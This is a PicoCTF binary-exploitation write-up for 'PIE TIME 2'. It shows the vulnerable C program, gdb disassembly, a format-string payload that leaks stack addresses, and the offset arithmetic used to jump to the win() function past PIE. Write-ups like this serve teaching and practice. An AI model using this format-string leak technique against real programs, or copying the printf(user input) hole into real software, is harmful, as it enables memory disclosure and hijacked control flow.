# PicoCTF - PIE TIME 2

## Challenge Overview
**Title:** PIE TIME 2  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** vuln.c, vuln

## Description
Can you try to get the flag? I'm not revealing anything anymore!!
Additional details will be available after launching your challenge instance.

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

## Initial Analysis

This challenge is the second part of **PIE TIME** so we again have to deal with **Position Independent Executable**.

We see again the `win()` function.

In `main` we see it simply call `call_functions`.

### `call_functions()`
```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

In the function we see again an address **input** that is cast to a **function pointer** and called.  
This time, however, the address of `main` is not given to us.

We see before the address input, we have another **input** which is then used as the string **format** for `printf`, a **classic** vulnerability.

```c
printf("Enter your name:");
fgets(buffer, 64, stdin);
printf(buffer);
```

## Detailed Analysis

Now what we need is to somehow **find** an address of the `.text` section while the program is being executed.

To do so we will **exploit** the format string vulnerability.

When running the binary we see:
```
Enter your name:
```
Here we will enter the following:
```
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
``` 

Which will print back
```
AAAA 0x5591e16502a1 (nil) 0x5591e16502d5 0x7ffcb4e3aef0 0x7c 0x7ffcb4fe6218 0x7fafdd6df6a0 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252070 0x7ffcb4e3af50 0x5591e05af1c0
```

The **0x41** is the output mark the **start** of our string we entered.  
We will use this to match the start of our input in the stack using  `gdb` to find an address in the `.text` section.

In `gdb` we see the disassembly of the `call_functions` function.
```
   0x00005555555552c7 <+0>:	endbr64 
   0x00005555555552cb <+4>:	push   %rbp
   0x00005555555552cc <+5>:	mov    %rsp,%rbp
   0x00005555555552cf <+8>:	sub    $0x60,%rsp
   0x00005555555552d3 <+12>:	mov    %fs:0x28,%rax
   0x00005555555552dc <+21>:	mov    %rax,-0x8(%rbp)
   0x00005555555552e0 <+25>:	xor    %eax,%eax
   0x00005555555552e2 <+27>:	lea    0xd45(%rip),%rdi        # 0x55555555602e
   0x00005555555552e9 <+34>:	mov    $0x0,%eax
   0x00005555555552ee <+39>:	callq  0x555555555140 <printf@plt>
   0x00005555555552f3 <+44>:	mov    0x2d26(%rip),%rdx        # 0x555555558020 <stdin@@GLIBC_2.2.5>
   0x00005555555552fa <+51>:	lea    -0x50(%rbp),%rax
   0x00005555555552fe <+55>:	mov    $0x40,%esi
   0x0000555555555303 <+60>:	mov    %rax,%rdi
   0x0000555555555306 <+63>:	callq  0x555555555160 <fgets@plt>
   0x000055555555530b <+68>:	lea    -0x50(%rbp),%rax
   0x000055555555530f <+72>:	mov    %rax,%rdi
   0x0000555555555312 <+75>:	mov    $0x0,%eax
   0x0000555555555317 <+80>:	callq  0x555555555140 <printf@plt>
=> 0x000055555555531c <+85>:	lea    0xd1d(%rip),%rdi        # 0x555555556040
   0x0000555555555323 <+92>:	mov    $0x0,%eax
   0x0000555555555328 <+97>:	callq  0x555555555140 <printf@plt>
   0x000055555555532d <+102>:	lea    -0x60(%rbp),%rax
   0x0000555555555331 <+106>:	mov    %rax,%rsi
   0x0000555555555334 <+109>:	lea    0xd34(%rip),%rdi        # 0x55555555606f
   0x000055555555533b <+116>:	mov    $0x0,%eax
   0x0000555555555340 <+121>:	callq  0x5555555551a0 <__isoc99_scanf@plt>
   0x0000555555555345 <+126>:	mov    -0x60(%rbp),%rax
   0x0000555555555349 <+130>:	mov    %rax,-0x58(%rbp)
   0x000055555555534d <+134>:	mov    -0x58(%rbp),%rax
   0x0000555555555351 <+138>:	callq  *%rax
   0x0000555555555353 <+140>:	nop
   0x0000555555555354 <+141>:	mov    -0x8(%rbp),%rax
   0x0000555555555358 <+145>:	xor    %fs:0x28,%rax
   0x0000555555555361 <+154>:	je     0x555555555368 <call_functions+161>
   0x0000555555555363 <+156>:	callq  0x555555555130 <__stack_chk_fail@plt>
   0x0000555555555368 <+161>:	leaveq 
   0x0000555555555369 <+162>:	retq
```

Line `<+80>` is the `printf` call that prints the **exploit**.  
We set a breakpoint **after** the call because the values found in the address start from the **top** of printf's stack frame.  

Now when execution pauses at the **breakpoint** we print values above the current `rbp` to see the values of printf's **stack frame** and try to match it to our original output.  
To do this I use, `x/32gx $rbp-128`

### Output
```
0x7fffffffdf00:	0x2070252041414141	0x7025207025207025
0x7fffffffdf10:	0x2520702520702520	0x2070252070252070
0x7fffffffdf20:	0x7025207025207025	0x2520702520702520
0x7fffffffdf30:	0x0000000a70252070	0x00007fffffffdf60
0x7ffdb7ed6400 0x5584fcbcf1c0
```

We find the start of our input, `0x41`, which ends at the address **0x7fffffffdf30**, then the following two values match the last two values from our original output which were **0x7ffcb4e3af50 0x5591e05af1c0**.

The value **0x00005555555551c0** is a code address, specifically the return address `printf` used to return back to `call_function`.

Now, we find the difference of that address from the start of `win`.

We find the address of `win` in `gdb` using `disas win` and getting the address of the first instruction, in my case **0x000055555555536a**.

**Address of `win`:** 0x000055555555536a  
**Address of we know:** 0x00005555555551c0  
**Difference:** 0x1aa

The **final** step is to add the difference we calculated to the **address** we found in the original output and calculated the actual address of `win`.  
0x5591e05af1c0 + 0x1aa = **0x5591E05AF36A**

Now, when asked to enter an address, we put **0x5591E05AF36A** and get our flag.

## Solution

- Enter as a name `AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p`  
- Get the final address  
- Add **0x1aa** to it  
- Enter result

### Execution Example:
```
Enter your name:AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
AAAA 0x5591e16502a1 (nil) 0x5591e16502d5 0x7ffcb4e3aef0 0x7c 0x7ffcb4fe6218 0x7fafdd6df6a0 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252070 0x7ffcb4e3af50 0x5591e05af1c0
 enter the address to jump to, ex => 0x12345: 0x5591E05AF36A
You won!
_______flag_______
```

## Tools Used
- `gdb`